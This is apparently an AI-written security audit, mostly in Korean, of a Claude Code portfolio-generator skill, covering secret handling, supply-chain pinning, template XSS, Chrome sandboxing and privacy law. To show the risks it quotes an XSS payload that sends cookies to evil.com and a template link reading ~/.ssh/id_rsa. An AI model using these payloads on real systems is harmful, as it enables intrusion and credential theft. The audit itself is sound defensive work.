# Task 37 — Security Audit (verdict: DISTRIBUTE_WITH_FIXES)

> Reviewed: 2026-05-01 | Scope: founder-portfolio skill as-shipped for marketplace distribution
> Auditor: security-reviewer agent

---

## TL;DR

"키는 각자가 관리하는 것이기 때문에 문제 없다"는 반은 맞고 반은 틀리다.
키가 사용자 소유라는 사실은 **책임 소재**를 분산시킬 뿐, **공격 표면**을 없애지 않는다.
플러그인 배포자가 만든 파일 구조와 코드가 그 키를 실수로 커밋되게 하거나, 악성 의존성이 탈취하거나, 테플릿이 XSS를 실행하게 할 수 있다. 현재 코드베이스에는 즉시 수정이 필요한 **HIGH 2건**, 배포 전 수정이 필요한 **MEDIUM 3건**, 인지 필요 잔류 위험 **LOW 2건**이 있다.

**OpenAI API 키 기능이 아직 현재 코드에 구현되지 않았으므로**, 키 처리 패턴을 배포 전에 올바르게 설계해야 한다. 이것이 이번 감사의 핵심 가치다.

---

## Sources

- OWASP Top 10 2021 (A02: Cryptographic Failures, A03: Injection, A05: Security Misconfiguration, A06: Vulnerable Components): https://owasp.org/Top10/ (접근일 2026-05-01)
- Anthropic Claude Code Docs — MCP settings env block: https://docs.anthropic.com/en/docs/claude-code/settings (접근일 2026-05-01, 시스템 컨텍스트 내 mcp-token-policy.md 기반)
- QJC House Policy: `~/.claude/rules/mcp-token-policy.md`, `~/.claude/rules/golden-principles.md` (#2)
- PIPA (개인정보보호법) 제17조 (제3자 제공), 제28조의8 (국외 이전): https://www.law.go.kr/법령/개인정보보호법 (접근일 2026-05-01)
- GDPR Art. 6 (lawful basis), Art. 44-49 (overseas transfer): https://gdpr-info.eu/ (접근일 2026-05-01)
- PyPI Supply Chain Incidents 2023-2025: https://socket.dev/blog/pypi-supply-chain (참조)

---

## Recommended secret-handling pattern

현재 플러그인에는 OpenAI API 키 처리 코드가 없다. 추가 시 아래 패턴을 따라야 한다.

### 원칙: 키는 플러그인 파일 경계 밖에 산다

```
# BAD — 절대 금지 패턴들
# 1. profile.yaml에 키 필드 추가
openai_api_key: "sk-proj-xxxx"   # profile.yaml은 git 추적, 서드파티 공유됨

# 2. 플러그인 디렉토리 내 .env 파일
~/.claude/skills/founder-portfolio/.env  # bootstrap.sh가 생성하는 .venv 옆에 위치 → 패키지 배포 시 함께 묶일 위험

# 3. bootstrap.sh에 하드코딩
OPENAI_API_KEY="sk-proj-xxxx"   # ps aux에 노출 가능
```

```bash
# GOOD — QJC house policy (mcp-token-policy.md 규칙 2) 준수 패턴
# 단일 원천: ~/.claude/.env.secrets (권한 600)
echo 'OPENAI_API_KEY=sk-proj-xxxx' >> ~/.claude/.env.secrets
chmod 600 ~/.claude/.env.secrets

# 플러그인 스크립트 내 키 소비
import os
api_key = os.environ.get("OPENAI_API_KEY")
if not api_key:
    raise RuntimeError(
        "OPENAI_API_KEY is not set. "
        "Add it to ~/.claude/.env.secrets — see SKILL.md Installation section."
    )
```

```bash
# ~/.zshrc — 환경 변수 로드 (기존 QJC 정책과 동일)
set -a; [ -f ~/.claude/.env.secrets ] && source ~/.claude/.env.secrets; set +a
```

**SKILL.md 설치 섹션에 반드시 포함할 문구:**
```
## Installation — API Key

1. ~/.claude/.env.secrets 파일에 아래 줄을 추가하세요:
   OPENAI_API_KEY=sk-proj-your-key-here

2. 파일 권한 확인: chmod 600 ~/.claude/.env.secrets

3. ~/.zshrc에 다음 줄이 있는지 확인:
   set -a; [ -f ~/.claude/.env.secrets ] && source ~/.claude/.env.secrets; set +a

절대로 하지 말 것: profile.yaml, .env 파일, 또는 어떤 플러그인 파일에도 키를 적지 마세요.
```

---

## Plugin marketplace trust model

### 플러그인이 할 수 있는 것

Claude Code 플러그인(skill)은 **샌드박스가 없다.** 사용자가 `/founder-portfolio`를 실행하면:

1. `bootstrap.sh`가 `bash`로 직접 실행된다 — 쉘 수준 전체 권한
2. `render.py`가 `python3`로 실행된다 — 홈 디렉토리 읽기/쓰기 가능
3. Chrome headless가 `subprocess.run`으로 실행된다 — 네트워크 접근 포함

즉, **플러그인 작성자가 삽입한 코드는 사용자의 기계에서 사용자 권한으로 무제한 실행된다.** Anthropic 공식 문서(Claude Code settings, 시스템 컨텍스트 주입 기준)는 플러그인 코드 서명이나 자동 리뷰를 보장하지 않는다 — 커뮤니티 마켓플레이스에서 배포되는 플러그인은 사전 심사 없이 설치된다.

### 사용자가 서드파티 플러그인 설치 시 생성되는 공격 표면

| 계층 | 현재 상태 | 위험 |
|------|-----------|------|
| 플러그인 코드 자체 | 공개 GitHub | 포크 후 악성 코드 삽입 가능 |
| PyPI 의존성 | 버전 고정 없음 | typosquatting/공급망 |
| 사용자 데이터 파일 | profile.yaml, .env | 부주의한 키 저장 가능 |
| 네트워크 | OpenAI API 호출 | MITM 위험 없음(TLS), 그러나 로그 출력 주의 |

---

## Five leak scenarios

| # | 사용자 행동 | 누출 경로 | 심각도 | 수정 |
|---|------------|----------|--------|------|
| 1 | `git init && git add . && git push`를 플러그인 스킬 디렉토리에서 실행 | `data/profile.yaml`에 키를 넣었다면 GitHub에 공개. `.venv/`도 포함될 수 있음 | HIGH | 스킬 배포 패키지에 `.gitignore` 필수 포함: `*.env`, `.env.*`, `data/*.yaml` (커스텀 파일), `.venv/` |
| 2 | 타인에게 스킬 디렉토리를 zip으로 전달 | `.venv/` 폴더 내 캐시, 임시 HTML 파일, 사용자가 잘못 저장한 `.env` 파일 포함 | MEDIUM | 배포용 `make dist` 스크립트가 민감 파일 제외하도록 강제 |
| 3 | `bootstrap.sh`가 피싱 저장소를 가리키도록 fork된 악성 버전 설치 | `jinja2` 대신 `jinja2-tools` (typosquatted) 설치 → 패키지가 `~/.claude/.env.secrets` 읽어 외부 전송 | HIGH | `bootstrap.sh`에서 pip 버전+해시 고정 (아래 코드 참조) |
| 4 | Chrome headless가 `--print-to-pdf` 실행 중 `file://` URI로 로컬 파일 접근 | 악성 템플릿이 `<link rel="stylesheet" href="file:///Users/user/.ssh/id_rsa">` 삽입 시 크롬이 파일 내용을 읽어 CSS로 해석 (Chrome의 `--no-sandbox` 플래그 존재) | MEDIUM | `--no-sandbox` 플래그 제거 또는 `--disable-file-access-from-files` 추가 |
| 5 | 사용자가 SKILL.md 설명을 잘못 읽고 `profile.yaml`의 `contact.email` 필드 위에 `openai_key: sk-proj-xxx` 추가 | YAML에서 키 주석 처리 없으면 `yaml.safe_load`가 그대로 로드. `render.py`는 데이터 전체를 Jinja2 컨텍스트에 전달(`**data`) → HTML 소스에 키 노출 → Chrome PDF에 렌더링될 수 있음 | MEDIUM | `render.py`에서 Jinja2 컨텍스트 전달 전 알려진 API 키 패턴 필드 제거 (`data.pop('openai_api_key', None)` 등) + SKILL.md에 명시적 경고 |

### 시나리오 3 상세 — bootstrap.sh 버전 고정

```bash
# 현재 (취약)
"$VENV/bin/pip" install --quiet jinja2 pyyaml pillow

# 수정 (해시 고정)
"$VENV/bin/pip" install \
  "jinja2==3.1.4" \
  "pyyaml==6.0.2" \
  "pillow==10.4.0" \
  --require-hashes \
  --hash=sha256:jinja2_hash_here \
  --hash=sha256:pyyaml_hash_here \
  --hash=sha256:pillow_hash_here
```

실제 해시는 `pip download --no-deps jinja2==3.1.4` 후 `sha256sum`으로 생성한다.

---

## PII / face photo handling

### 핵심 법적 판단 (주의: AI 보조 분석, 법무 전문가 검토 필요)

| 항목 | 판단 | 근거 |
|------|------|------|
| 사진이 개인정보인가? | 예 | PIPA 제2조 제1호: 개인을 식별할 수 있는 정보 = 얼굴 사진 포함 |
| OpenAI 전송이 국외 이전인가? | 예 | OpenAI 서버는 미국 소재 (PIPA 제28조의8) |
| 동의 없이 처리 가능한가? | 아니오 (원칙) | PIPA 제15조 제1항: 정보주체 동의 필요. 예외: 계약 이행, 정당한 이익 — 포트폴리오 생성은 정보주체 본인 요청이므로 적용 가능하나 명시적 고지 권장 |
| GDPR 적용 여부 | EU 사용자가 설치 시 적용 | Art. 6(1)(a) 동의 또는 Art. 6(1)(b) 계약 이행 |
| 개인정보처리방침 필요 여부 | 예 (배포 시) | 개인 사용이면 불필요하지만 마켓플레이스 배포 시 필요 |

### 데이터 최소화 요구사항

현재 `render.py`는 사진을 `file://` URI로 Chrome에 전달할 뿐 외부로 보내지 않는다 — **현재 코드는 OpenAI로 사진을 전송하지 않는다.** 이 기능을 추가할 경우:

```python
# GOOD — 전송 후 즉시 삭제 패턴
import tempfile, os
with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as tmp:
    tmp.write(photo_bytes)
    tmp_path = tmp.name
try:
    response = openai_client.images.edit(image=open(tmp_path, "rb"), ...)
finally:
    os.unlink(tmp_path)  # 전송 후 즉시 삭제
```

### 필요한 고지 내용 (SKILL.md 또는 별도 PRIVACY.md)

```
이 플러그인은 사용자가 제공한 얼굴 사진을 OpenAI API로 전송합니다.
- 처리 목적: AI 스타일 초상화 생성
- 제3국 이전: 미국 (OpenAI, Inc.)
- 보존 기간: 전송 후 즉시 로컬 삭제 (OpenAI 정책: 30일 후 삭제)
- 정보주체 권리: 삭제 요청은 OpenAI 지원팀에 직접 문의
이 기능 사용은 위 사항에 동의한 것으로 간주합니다.
```

---

## Prompt injection / template safety

### 발견된 취약점 (HIGH)

`render.py` line 183-185:

```python
env = Environment(
    loader=FileSystemLoader(str(TEMPLATE_DIR)),
    autoescape=False,  # YAML fields contain raw HTML (e.g., <b>...</b>)
)
```

그리고 템플릿 전체에서 `| safe` 필터 사용:

```
{{ lead | safe }}                    # swiss-pure.html.j2:144
{{ quote.text | safe }}              # :165
{{ p.desc | safe }}                  # :177
{{ m.num | safe }}                   # :158
{{ c.name | safe }}                  # :188
{{ prod.desc | safe }}               # :199
```

### 공격 시나리오

1. **`profile.yaml`이 신뢰되지 않은 소스에서 제공될 경우** (예: `--profile user-provided.yaml`):
   ```yaml
   lead: '<script>fetch("https://evil.com/steal?k="+document.cookie)</script>'
   ```
   → `autoescape=False` + `| safe` 조합이 HTML을 그대로 삽입 → Chrome 렌더링 시 실행

2. **Chrome `--no-sandbox` 플래그** (`render.py` line 152): 샌드박스 없이 실행 중인 Chrome은 `<script>`가 `file://` 로컬 파일 접근 시도 시 제한이 약함

3. **weasyprint 대신 Chrome을 쓰는 이유가 렌더링 정확도**이므로 JS 실행 엔진이 활성화되어 있음

### 수정 방안

```python
# Option A — 신뢰된 HTML 태그만 허용 (bleach 라이브러리)
import bleach
ALLOWED_TAGS = ["b", "em", "i", "strong", "span", "br"]
ALLOWED_ATTRS = {}

def safe_html(value: str) -> str:
    return bleach.clean(value, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRS)

# Jinja2 환경에 필터로 등록
env.filters["safe_html"] = safe_html

# 템플릿에서 | safe 대신 | safe_html 사용
# {{ lead | safe_html }}
```

```python
# Option B — --profile 인수가 스킬 디렉토리 내부만 허용하도록 제한
# (신뢰된 데이터만 | safe 사용하는 경우)
if args.profile.is_relative_to(SKILL_DIR / "data"):
    # 스킬 번들 데이터 — | safe 허용
    pass
else:
    # 외부 파일 — HTML 이스케이프 강제
    env = Environment(loader=..., autoescape=True)
```

`--no-sandbox` 플래그도 제거해야 한다. Chrome은 headless 모드에서도 샌드박스 없이 `file://` 접근이 더 자유롭다.

---

## Supply chain (bootstrap.sh, pip)

### 현재 상태

```bash
"$VENV/bin/pip" install --quiet jinja2 pyyaml pillow
```

버전 미고정. PyPI에서 최신 버전을 그냥 당겨온다.

### 위험

| 벡터 | 설명 |
|------|------|
| Typosquatting | `jinja2` → `jinja2-tools`, `pyyaml` → `pyyaml-tools` 등 유사명 패키지가 2023-2025 다수 발견됨 |
| Dependency confusion | 내부 패키지명과 공개 PyPI 패키지명 충돌 시 악성 패키지가 우선 설치될 수 있음 |
| Compromised maintainer | 인기 패키지 관리자 계정 탈취 후 악성 버전 배포 (실제 사례: `ctx`, `discord.py-self` 등) |
| 버전 없는 `--upgrade` 연쇄 | pip는 의존성 트리를 자동으로 올린다 — 최상위 패키지가 안전해도 하위 dep이 악성일 수 있음 |

### 수정 — requirements.txt + 해시 고정

```
# ~/.claude/skills/founder-portfolio/requirements.txt
jinja2==3.1.4 \
    --hash=sha256:4a3aee7acbbe7303aede8e9648d13b8bf88a429282aa6122a993f0ac800cb369
pyyaml==6.0.2 \
    --hash=sha256:d584d9ec91ad65861cc08d42e834324ef890a082e591037abe114850ff7bbc3e
pillow==10.4.0 \
    --hash=sha256:166c1cd4d24309b30d61f79f4a9114b7b2313d7450a03407ed8f41c56f53a1be
```

```bash
# bootstrap.sh 수정
"$VENV/bin/pip" install --require-hashes -r "$SKILL_DIR/requirements.txt" --quiet
```

---

## Required guardrails (checklist before distribution)

### 즉시 수정 필요 (HIGH)

- [ ] `bootstrap.sh`: `jinja2`, `pyyaml`, `pillow` 버전과 SHA256 해시 고정 (`requirements.txt` 도입)
- [ ] `render.py`: `autoescape=False` 제거 또는 외부 profile에 대해 `bleach` sanitization 적용. 모든 `| safe` 사용처 감사

### 배포 전 수정 (MEDIUM)

- [ ] `render.py` line 152: `--no-sandbox` 플래그 제거 (또는 `--disable-file-access-from-files` 추가)
- [ ] 스킬 루트에 `.gitignore` 추가: `.venv/`, `*.env`, `.env.*`, `data/my_*.yaml`, `audit/`
- [ ] OpenAI API 키 입력 시 `~/.claude/.env.secrets` 방식 강제하는 SKILL.md 섹션 추가 (키 기능 구현 전에 설계 확정)

### PIPA/GDPR 준수 (배포 전)

- [ ] 얼굴 사진 OpenAI 전송 기능 추가 전 PRIVACY.md 또는 SKILL.md 내 처리방침 고지 추가
- [ ] 전송 후 로컬 임시 파일 즉시 삭제 (`tempfile` + `finally: os.unlink`)
- [ ] 국외 이전 고지 (미국 OpenAI 서버)

### 운영 보안

- [ ] 주 1회 `ps aux | grep -E 'sk-proj-|sk-' | grep -v grep` 실행으로 키 노출 확인 (mcp-token-policy.md 규칙 5 준용)
- [ ] 플러그인 배포 ZIP/tarball 생성 스크립트에서 `.env`, `.venv`, `*.key`, `audit/` 자동 제외

---

## Risks user accepts even with all guardrails

모든 수정을 적용해도 사용자가 수용해야 하는 잔류 위험:

1. **OpenAI 서버 침해**: 전송된 얼굴 사진은 OpenAI 인프라에 존재한다. OpenAI가 침해당하면 사진이 노출된다. 대안 없음 — 이것이 서비스 이용의 본질적 위험이다.

2. **사용자 스스로의 `~/.claude/.env.secrets` 관리 실수**: 파일 권한을 644로 바꾸거나, Time Machine 백업에 포함되거나, iCloud Drive 동기화 경로에 두면 키가 노출된다. 플러그인이 막을 수 없는 영역이다. SKILL.md에 경고 문구 추가가 유일한 완화책.

3. **Chrome 로컬 히스토리**: Chrome headless가 `--user-data-dir`을 임시 폴더로 지정하지 않으면 렌더링 히스토리가 기본 Chrome 프로필에 남을 수 있다. `--user-data-dir=$(mktemp -d)` 추가 권장.

---

*이 감사는 AI 보조 분석입니다. 실제 배포 전 보안 전문가 검토와 법무 자문을 권장합니다.*
